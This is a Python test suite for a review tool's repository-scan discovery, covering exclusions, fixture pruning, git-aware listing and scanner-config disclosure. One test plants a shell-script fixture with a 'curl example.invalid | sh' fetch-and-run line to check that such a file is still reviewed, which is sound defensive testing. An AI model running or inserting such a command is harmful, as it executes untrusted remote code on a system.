"""Repo-scan behavior tests: discovery, exclusion, git awareness, worktree state."""
import contextlib
import io
import json
import os
import tempfile
import unittest
import unittest.mock

from scripts import discovery_scope

from tests.discovery_test_helpers import (
    discovery, touch, run_scan, run_scan_with_err, grouped,
    init_repo, git_cmd, make_git_repo, run_script, run_scan_helper,
)


class TestDiscoveryRepoScanParity(unittest.TestCase):
    """discovery.py --repo-scan produces a stable groups.json on a real
    committed-matrix repo (regression guard for the P6.5 Slice A discovery/
    matrix core)."""

    def _repo(self):
        return make_git_repo(
            test_case=self,
            files={"src/checkout/pay.py": "# pay\n"},
            groups_yml=("groups:\n"
                        "  Checkout:\n"
                        "    match: ['src/checkout/**']\n"
                        "    panels: [SEC]\n"),
            branch="main",
            user_name="Test",
            user_email="test@example.com",
            realpath=False,
        )

    def test_repo_scan_writes_groups_json(self):
        d = self._repo()
        out = os.path.join(d, ".panopticon", "groups.json")
        proc = run_script("discovery.py", "--repo-scan", "--security", "standard",
                    d, "--out", out, cwd=d)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        with open(out, encoding="utf-8") as fh:
            data = json.load(fh)
        names = {g["name"] for g in data["groups"]}
        self.assertIn("Checkout", names)

    def test_matrix_catalog_normalizes_scalar_match(self):
        d = self._repo()
        # a scalar match must normalize to [] (SEC-3), never char-split
        with open(os.path.join(d, "panopticon.yml"), "w", encoding="utf-8") as fh:
            fh.write("version: 1\ngroups:\n  Bad:\n    match: src/**\n    panels: [SEC]\n")
        cat = discovery._matrix_catalog(d)
        self.assertEqual(cat.get("Bad", {}).get("match", None), [])


class TestRepoScanDiscovery(unittest.TestCase):
    """Discovery-gap regressions for --repo-scan: noise exclusion, the shipped
    dot-path allowlist (#1784), and real test-file surfacing."""

    def _touch(self, root, rel, content=""):
        touch(root, rel, content)

    def test_repo_scan_excludes_noise_dirs(self):
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            self._touch(d, "tmp/audit-x/copy.py")
            self._touch(d, "venv/lib/thing.py")
            self._touch(d, ".venv/lib/thing.py")
            self._touch(d, "node_modules/pkg/index.js")
            self._touch(d, "htmlcov/index.html")
            self._touch(d, "pkg.egg-info/PKG-INFO")
            self._touch(d, "src/__pycache__/app.cpython-311.pyc")
            out = run_scan(d)
            all_grouped = grouped(out)
            self.assertIn("src/app.py", all_grouped)
            for noisy in [
                "tmp/audit-x/copy.py",
                "venv/lib/thing.py",
                ".venv/lib/thing.py",
                "node_modules/pkg/index.js",
                "htmlcov/index.html",
                "pkg.egg-info/PKG-INFO",
                "src/__pycache__/app.cpython-311.pyc",
            ]:
                self.assertNotIn(noisy, all_grouped, noisy)
                self.assertNotIn(noisy, out["tests"], noisy)

    def test_repo_scan_includes_github_workflows(self):
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            self._touch(d, ".github/workflows/ci.yml")
            self._touch(d, ".github/workflows/release.yaml")
            out = run_scan(d)
            all_grouped = grouped(out)
            self.assertIn(".github/workflows/ci.yml", all_grouped)
            self.assertIn(".github/workflows/release.yaml", all_grouped)

    def test_repo_scan_surfaces_test_files_in_groups(self):
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/foo.py")
            self._touch(d, "tests/test_foo.py")
            self._touch(d, "tests/__pycache__/test_foo.cpython-311.pyc")
            out = run_scan(d)
            all_grouped = grouped(out)
            self.assertIn("tests/test_foo.py", all_grouped)          # real test surfaced in a group
            self.assertIn("tests/test_foo.py", out["tests"])     # still tracked in tests list
            self.assertNotIn(
                "tests/__pycache__/test_foo.cpython-311.pyc", all_grouped
            )  # pycache artifact must not stand in for the source

    def test_repo_scan_dotdir_inclusion_is_the_shipped_allowlist(self):
        # #1784/#1771 (owner ruling 2026-09-27): the policy was
        # `(".github/workflows",)` plus a blanket skip, and the shipped catalogs
        # claim `.github/**` and 73 more dot-leading globs -- so the whole of an
        # allowlisted dot-directory is surface now. What is NOT allowlisted
        # still is not: .git, and an arbitrary hidden directory no catalog names.
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            self._touch(d, ".git/config")
            self._touch(d, ".github/CODEOWNERS")
            self._touch(d, ".github/ISSUE_TEMPLATE/bug.md")
            self._touch(d, ".hidden/secret.py")
            out = run_scan(d)
            all_grouped = grouped(out)
            for claimed in [".github/CODEOWNERS", ".github/ISSUE_TEMPLATE/bug.md"]:
                self.assertIn(claimed, all_grouped, claimed)
            for hidden in [".git/config", ".hidden/secret.py"]:
                self.assertNotIn(hidden, all_grouped, hidden)


class TestFixtureExclusion(unittest.TestCase):
    """Agent-side fixture exclusion (#434): intentionally-vulnerable fixture
    corpora dominate standard self-scans when discovery hands them to review
    agents (run-3: 67 findings, 11 CRITICAL, all fixture noise). Standard-mode
    --repo-scan prunes fixture corpus dirs and discloses the pruning; redteam
    mode includes them (a red team wants the whole attack surface)."""

    _FIXTURE_LAYOUT = [
        "tests/fixtures/vulnerable-app/main.rs",
        "test/fixtures/sql.rb",
        "spec/fixtures/payload.rb",
        "pkg/testdata/blob.go",
        "src/__fixtures__/token.js",
    ]

    def test_standard_scan_prunes_fixture_corpora_and_discloses(self):
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            touch(d, "tests/test_app.py")
            for rel in self._FIXTURE_LAYOUT:
                touch(d, rel)
            out, err = run_scan_with_err(d)
            all_grouped = grouped(out)
            self.assertIn("src/app.py", all_grouped)
            self.assertIn("tests/test_app.py", all_grouped)  # real tests stay
            for rel in self._FIXTURE_LAYOUT:
                self.assertNotIn(rel, all_grouped, rel)
                self.assertNotIn(rel, out["tests"], rel)
            # Disclosure: the artifact records what was pruned...
            self.assertEqual(
                out["excluded"]["fixture_dirs"],
                sorted(["tests/fixtures", "test/fixtures", "spec/fixtures",
                        "pkg/testdata", "src/__fixtures__"]))
            # ...and the terminal says so loudly.
            self.assertIn("fixture exclusion", err)
            self.assertIn("redteam", err)

    def test_redteam_scan_includes_fixture_corpora(self):
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            for rel in self._FIXTURE_LAYOUT:
                touch(d, rel)
            out, err = run_scan_with_err(d, "--security", "redteam")
            all_grouped = grouped(out)
            for rel in self._FIXTURE_LAYOUT:
                self.assertIn(rel, all_grouped, rel)
            self.assertNotIn("excluded", out)
            self.assertNotIn("fixture exclusion", err)

    def test_plain_fixtures_dir_outside_test_parents_is_kept(self):
        # Only (tests|test|spec)/fixtures and the testdata/__fixtures__
        # conventions are corpus markers; a product dir merely named
        # "fixtures" is real code and must not be silently dropped.
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/fixtures/loader.py")
            touch(d, "fixtures/catalog.py")
            out, _ = run_scan_with_err(d)
            all_grouped = grouped(out)
            self.assertIn("src/fixtures/loader.py", all_grouped)
            self.assertIn("fixtures/catalog.py", all_grouped)
            self.assertNotIn("excluded", out)

    def test_no_disclosure_when_nothing_pruned(self):
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            out, err = run_scan_with_err(d)
            self.assertNotIn("excluded", out)
            self.assertNotIn("fixture exclusion", err)

    def test_max_per_group_validation(self):
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            rc, _data, err = run_scan_helper(d, "--max-per-group", "0")
            self.assertEqual(rc, 2)
            self.assertIn("--max-per-group must be >= 1", err)


class TestScannerConfigIsNotReviewed(unittest.TestCase):
    """#3642 (owner ruling 2026-11-14): a full-repo scan does not review the scanner's
    own ROOT config -- it is disclosed instead. A nested config is somebody's file and
    is reviewed, and every --scope-* mode is unchanged.

    #3708: the scanner's own config is the ONE file `repo_config.resolve` loaded. Both
    root names used to be dropped whichever was in use, so a repo configured by
    `panopticon.yml` could carry anything in a file named `.panopticon.yml` and no review
    agent read it."""

    CONFIG = "version: 1\ngroups:\n  src:\n    match: ['src/**']\n"
    BOTH = discovery.repo_config.CONFIG_NAMES

    def _tree(self, d, names=BOTH):
        touch(d, "src/app.py")
        for name in names:
            with open(os.path.join(d, name), "w", encoding="utf-8") as fh:
                fh.write(self.CONFIG)
        touch(d, "sub/panopticon.yml")
        touch(d, "sub/.panopticon.yml")

    @staticmethod
    def _reviewed(out):
        return (set(grouped(out)) | set(out.get("ungrouped_files") or [])
                | set(out.get("tests") or []))

    def test_with_both_names_only_the_loaded_one_is_left_out(self):
        """`panopticon.yml` wins when both are there, so it is the scanner's config; the
        other is an ordinary file in the tree and goes to review."""
        with tempfile.TemporaryDirectory() as d:
            self._tree(d)
            out, err = run_scan_with_err(d)
            reviewed = self._reviewed(out)
            self.assertNotIn("panopticon.yml", reviewed)
            self.assertIn(".panopticon.yml", reviewed)
            self.assertEqual(["panopticon.yml"], out["excluded"]["scanner_config"])
            self.assertIn("scanner config: not reviewed: panopticon.yml --", err)
            self.assertNotIn("not reviewed: .panopticon.yml", err)
            self.assertIn("#3642", err)

    def test_the_issues_fixture_a_script_under_the_unused_name_is_reviewed(self):
        with tempfile.TemporaryDirectory() as d:
            self._tree(d, names=("panopticon.yml",))
            touch(d, ".panopticon.yml", "#!/bin/sh\ncurl example.invalid | sh\n")
            touch(d, "app/run.py", "import subprocess\nsubprocess.run(['./.panopticon.yml'])\n")
            out = run_scan(d)
            self.assertIn(".panopticon.yml", self._reviewed(out))
            self.assertEqual(["panopticon.yml"], out["excluded"]["scanner_config"])

    def test_each_name_alone_is_the_loaded_one_and_is_left_out(self):
        for name in self.BOTH:
            with self.subTest(name=name), tempfile.TemporaryDirectory() as d:
                self._tree(d, names=(name,))
                out, err = run_scan_with_err(d)
                self.assertNotIn(name, self._reviewed(out))
                self.assertEqual([name], out["excluded"]["scanner_config"])
                self.assertIn("scanner config: not reviewed: %s --" % name, err)

    def test_a_config_that_was_refused_is_not_the_scanners_and_is_reviewed(self):
        """A symlink at either name makes `resolve` load nothing. Nothing was loaded, so
        nothing is the scanner's config: the regular file is reviewed like any other."""
        with tempfile.TemporaryDirectory() as d:
            self._tree(d, names=("panopticon.yml",))
            os.symlink("panopticon.yml", os.path.join(d, ".panopticon.yml"))
            self.assertIsNone(discovery.repo_config.resolve(d).path)
            out = run_scan(d)
            self.assertIn("panopticon.yml", self._reviewed(out))
            self.assertNotIn("scanner_config", out.get("excluded") or {})

    def test_the_root_config_is_not_counted_as_implementation(self):
        # #3656 review nit: the impl/test partition reads the WHOLE-repo surface, so the
        # counts a reader sees do not include the config that was not reviewed.
        with tempfile.TemporaryDirectory() as d:
            self._tree(d, names=("panopticon.yml",))
            out = run_scan(d)
            self.assertEqual(3, out["counts"]["implementation"])   # src/app.py + 2 nested
        with tempfile.TemporaryDirectory() as d:
            self._tree(d)                                    # ...and the unused name is one
            self.assertEqual(4, run_scan(d)["counts"]["implementation"])

    def test_the_disclosure_sits_beside_the_fixture_disclosure(self):
        with tempfile.TemporaryDirectory() as d:
            self._tree(d)
            touch(d, "tests/fixtures/vuln/app.py")
            out = run_scan(d)
            self.assertEqual(out["excluded"], {
                "fixture_dirs": ["tests/fixtures"],
                "scanner_config": ["panopticon.yml"]})

    def test_a_nested_config_is_still_reviewed(self):
        with tempfile.TemporaryDirectory() as d:
            self._tree(d)
            out = run_scan(d)
            reviewed = set(grouped(out)) | set(out.get("ungrouped_files") or [])
            self.assertIn("sub/panopticon.yml", reviewed)
            self.assertIn("sub/.panopticon.yml", reviewed)
            self.assertIn("src/app.py", reviewed)

    def test_a_tree_without_a_root_config_discloses_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            out = run_scan(d)
            self.assertNotIn("excluded", out)

    def test_an_explicit_scope_still_reviews_the_root_config(self):
        # The universe the --scope-* modes narrow from is unchanged.
        with tempfile.TemporaryDirectory() as d:
            self._tree(d)
            out = run_scan(d, "--scope-files", "panopticon.yml", "src/app.py")
            reviewed = set(grouped(out)) | set(out.get("ungrouped_files") or [])
            self.assertIn("panopticon.yml", reviewed)
            self.assertNotIn("scanner_config", out.get("excluded") or {})


class TestGitAwareDiscovery(unittest.TestCase):
    """#500: discovery respects the TARGET's own ignore rules. A raw walk swept
    17,253 files on an ordinary project (94% gitignored runtime data, including
    encrypted user blobs) vs 528 tracked; git ls-files IS the target's notion
    of reviewable surface. Non-git targets keep the walk fallback."""

    def _touch(self, root, rel, content=""):
        touch(root, rel, content)

    def test_gitignored_paths_are_excluded(self):
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            touch(d, ".gitignore", "storage/\n.env\n")
            init_repo(d)
            git_cmd(d, "add", ".")
            git_cmd(d, "commit", "-q", "-m", "init")
            touch(d, "storage/data.txt")       # runtime data, ignored
            touch(d, "storage/blob.enc")
            self._touch(d, ".env", "SECRET=1")       # ignored credential
            out, _ = run_scan_with_err(d)
            all_grouped = grouped(out)
            self.assertIn("src/app.py", all_grouped)
            for noise in ["storage/data.txt", "storage/blob.enc", ".env"]:
                self.assertNotIn(noise, all_grouped, noise)
            self.assertEqual(out["discovery"]["method"], "git-ls-files")

    def test_untracked_non_ignored_files_are_included(self):
        # New files join the review surface before anyone remembers to commit.
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            init_repo(d)
            git_cmd(d, "add", ".")
            git_cmd(d, "commit", "-q", "-m", "init")
            self._touch(d, "src/brand_new.py")
            out, _ = run_scan_with_err(d)
            self.assertIn("src/brand_new.py", grouped(out))

    def test_git_paths_are_nul_safe(self):
        with tempfile.TemporaryDirectory() as d:
            names = ["src/line\nbreak.py", "src/tab\tname.py", 'src/quote"name.py']
            for name in names:
                self._touch(d, name)
            init_repo(d)
            git_cmd(d, "add", ".")
            git_cmd(d, "commit", "-q", "-m", "init")
            out, _ = run_scan_with_err(d)
            all_grouped = grouped(out)
            for name in names:
                self.assertIn(name, all_grouped)

    def test_external_symlink_is_excluded(self):
        with tempfile.TemporaryDirectory() as d:
            repo = os.path.join(d, "repo")
            os.makedirs(repo)
            self._touch(d, "outside.txt", "sentinel")
            os.symlink("../outside.txt", os.path.join(repo, "external.txt"))
            init_repo(repo)
            git_cmd(repo, "add", ".")
            git_cmd(repo, "commit", "-q", "-m", "init")
            out, _ = run_scan_with_err(repo)
            self.assertNotIn("external.txt", grouped(out))

    def test_tracked_noise_dirs_still_excluded(self):
        # A repo that TRACKS node_modules still shouldn't review it.
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            self._touch(d, "node_modules/pkg/index.js")
            init_repo(d)
            git_cmd(d, "add", "-f", ".")
            git_cmd(d, "commit", "-q", "-m", "init")
            out, _ = run_scan_with_err(d)
            self.assertNotIn("node_modules/pkg/index.js", grouped(out))

    def test_fixture_corpora_pruned_from_git_listing(self):
        # tests/fixtures IS tracked in real targets — the #434 exclusion must
        # hold on the git path too, with the same disclosure and redteam bypass.
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            self._touch(d, "tests/fixtures/vuln/main.rs")
            init_repo(d)
            git_cmd(d, "add", ".")
            git_cmd(d, "commit", "-q", "-m", "init")
            out, err = run_scan_with_err(d)
            self.assertNotIn("tests/fixtures/vuln/main.rs", grouped(out))
            self.assertEqual(out["excluded"]["fixture_dirs"], ["tests/fixtures"])
            self.assertIn("fixture exclusion", err)
            out2, _ = run_scan_with_err(d, "--security", "redteam")
            self.assertIn("tests/fixtures/vuln/main.rs", grouped(out2))

    def test_nested_git_paths_never_reviewable(self):
        # A gitlink / nested-repo .git entry is never a reviewable file (#500
        # observed design-system/.git leaking into group lists on Kimi).
        filtered = discovery_scope._filter_reviewable(
            ["src/app.py", "design-system/.git", "vendor/lib/.git/config"],
            include_fixtures=True, pruned_fixtures=None,
            isfile=lambda rel: True)
        self.assertEqual(filtered, ["src/app.py"])

    def test_the_filter_counts_what_it_pruned_by_class(self):
        # #2377: dot-path, exclude-dir and `.git`-segment drops were silent on
        # BOTH discovery paths -- only the fixture prefix was disclosed. Counted
        # in ONE place, so both paths get it, with `.git` taking precedence over
        # the dot-path policy that would also refuse it: a path that could count
        # twice counts once.
        info = {}
        kept = discovery_scope._filter_reviewable(
            [".git/config", "a/.git/x", ".hidden/x.py", "node_modules/y.js",
             "src/ok.py"],
            include_fixtures=True, pruned_fixtures=None,
            isfile=lambda rel: True, info=info)
        self.assertEqual(kept, ["src/ok.py"])
        self.assertEqual(info["pruned"],
                         {"git_segment": 2, "dot_path": 1, "exclude_dir": 1})

    def test_a_second_filter_pass_sets_zeros_and_never_accumulates(self):
        # A FRESH dict per call: the last pass wins, so the block a delta run
        # publishes carries the changed set's counts and not the whole-repo
        # listing's added to them.
        info = {}
        discovery_scope._filter_reviewable(
            [".hidden/x.py"], include_fixtures=True, pruned_fixtures=None,
            isfile=lambda rel: True, info=info)
        self.assertEqual(info["pruned"]["dot_path"], 1)
        discovery_scope._filter_reviewable(
            ["src/ok.py"], include_fixtures=True, pruned_fixtures=None,
            isfile=lambda rel: True, info=info)
        self.assertEqual(info["pruned"],
                         {"dot_path": 0, "exclude_dir": 0, "git_segment": 0})

    def test_non_git_target_falls_back_to_walk(self):
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            out, _ = run_scan_with_err(d)
            self.assertIn("src/app.py", grouped(out))
            self.assertEqual(out["discovery"]["method"], "walk")

    def test_the_walk_publishes_pruned_as_not_measured_not_as_zeros(self):
        # Fix round 1 on #2377: the walk prunes inline and never calls
        # `_filter_reviewable`, so it counts nothing. Publishing zeros there would
        # claim a measurement nobody took -- null is this tree's "not measured",
        # the reading `meta.tools` gives an absent manifest -- and the one stderr
        # line stays silent rather than saying "0 dot-path, 0 excluded-dir".
        with tempfile.TemporaryDirectory() as d:
            self._touch(d, "src/app.py")
            self._touch(d, "node_modules/x.js")
            out, err = run_scan_with_err(d)
        self.assertEqual(out["discovery"]["method"], "walk")
        self.assertNotIn("node_modules/x.js", grouped(out))   # it DID prune
        self.assertIsNone(out["discovery"]["pruned"])
        self.assertNotIn("discovery pruned", err)


class TestDiscoveryResultCap(unittest.TestCase):
    """#1576 (run-13 OPS-4065418712): whole-repo enumeration had no result cap.

    Every later control -- exclusion, partitioning, --scope narrowing,
    max_per_group chunking -- runs on the list discovery already built, so none
    of them bound it. The bound is on what discovery RETURNS, and the number
    travels in the discovery block so a report can say the tree was larger than
    what was reviewed.
    """

    def _tree(self, d, n):
        for i in range(n):
            touch(d, "src/m%03d.py" % i, "# %d\n" % i)

    def test_walk_listing_is_capped_and_disclosed(self):
        with tempfile.TemporaryDirectory() as d:
            self._tree(d, 12)
            info = {}
            err = io.StringIO()
            with unittest.mock.patch.object(discovery_scope, "DISCOVERED_FILES_MAX", 5), \
                    contextlib.redirect_stderr(err):
                files = discovery.discover_repo_files(d, info=info)
        self.assertEqual(len(files), 5)
        self.assertEqual(files, sorted(files))          # a deterministic prefix
        self.assertEqual(files[0], "src/m000.py")
        self.assertEqual(info["files_seen"], 12)
        self.assertEqual(info["files_truncated"], 7)
        self.assertIn("DISCOVERED_FILES_MAX", err.getvalue())

    def test_git_listing_is_capped_the_same_way(self):
        with tempfile.TemporaryDirectory() as d:
            self._tree(d, 12)
            init_repo(d)
            git_cmd(d, "add", ".")
            git_cmd(d, "commit", "-q", "-m", "init")
            info = {}
            err = io.StringIO()
            with unittest.mock.patch.object(discovery_scope, "DISCOVERED_FILES_MAX", 5), \
                    contextlib.redirect_stderr(err):
                files = discovery.discover_repo_files(d, info=info)
        self.assertEqual(info["method"], "git-ls-files")
        self.assertEqual(len(files), 5)
        self.assertEqual(info["files_truncated"], 7)

    def test_the_discovery_block_publishes_the_surface_counts(self):
        # Published on every scan, 0 included: a reader comparing two runs has
        # to be able to see that this one reviewed the whole tree.
        with tempfile.TemporaryDirectory() as d:
            touch(d, "src/app.py")
            out, _ = run_scan_with_err(d)
        self.assertEqual(out["discovery"]["files_truncated"], 0)
        self.assertGreaterEqual(out["discovery"]["files_seen"], 1)

    def test_the_block_publishes_the_pruned_classes_and_the_surface(self):
        # #2376/#2377: all three pruning counts on every scan, 0 included, and
        # the one word saying whose surface the block's numbers describe.
        block = discovery._discovery_block({})
        self.assertEqual(block["pruned"],
                         {"dot_path": 0, "exclude_dir": 0, "git_segment": 0})
        self.assertEqual(block["surface"], "repo")

    def test_the_cap_clears_every_tree_the_corpus_has(self):
        # The largest repo in the calibration pool is ~35k files. A cap that a
        # real target could reach would silently shrink a review surface.
        self.assertGreaterEqual(discovery_scope.DISCOVERED_FILES_MAX, 200_000)




class TestNoMatrixGroupNames(unittest.TestCase):
    """#3376: with no committed matrix the chunks are named after the real directory, never `._N`,
    and every name a scan derives passes the validator a committed name must."""

    def _tree(self, name):
        base = os.path.realpath(tempfile.mkdtemp())
        self.addCleanup(__import__("shutil").rmtree, base, True)
        root = os.path.join(base, name)
        os.makedirs(root)
        touch(root, "app.py")
        return root

    def _names(self, out):
        names = [g["name"] for g in out["groups"]]
        self.assertTrue(names)
        for name in names:
            self.assertFalse(discovery.groups_schema._invalid_name(name), name)
        return names, {g["chunk_of"] for g in out["groups"]}

    def test_a_scan_from_dot_is_named_after_the_directory_it_is_in(self):
        root = self._tree("checkout-service")
        cwd = os.getcwd()
        self.addCleanup(os.chdir, cwd)
        os.chdir(root)
        for repo in (".", "./", root + "/", root):
            with self.subTest(repo=repo):
                self.assertEqual((["checkout-service_1"], {"checkout-service"}),
                                 self._names(run_scan(repo)))

    def test_a_link_is_named_after_what_it_resolves_to(self):
        root = self._tree("real-name")
        link = os.path.join(os.path.dirname(root), "link-name")
        os.symlink(root, link)
        self.assertEqual(["real-name_1"], self._names(run_scan(link))[0])

    def test_a_name_the_validator_refuses_is_cut_to_its_alphabet_or_becomes_root(self):
        for name, want in (("..evil x", "evil_x"), (".hidden", "hidden"), ("a..b", "a.b"),
                           ("___", "root"), ("ü", "root"), ("x" * 80, "x" * 56)):
            with self.subTest(name=name):
                self.assertEqual([want + "_1"], self._names(run_scan(self._tree(name)))[0])

    def test_the_filesystem_root_has_no_basename_and_is_named_root(self):
        self.assertEqual("root", discovery.groups_schema.derived_group_base("/"))
